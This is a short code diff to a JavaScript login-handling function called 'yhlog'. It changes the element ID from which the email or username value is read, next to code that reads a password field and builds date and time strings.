@@ -103,7 +103,7 @@ function yhlog() {
     window.alert("Error: " + errorMessage);
   });
 
-  var email = document.getElementById('yh-email').value;
+  var email = document.getElementById('yh-uname').value;
   var password = document.getElementById('yh-pass').value;
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
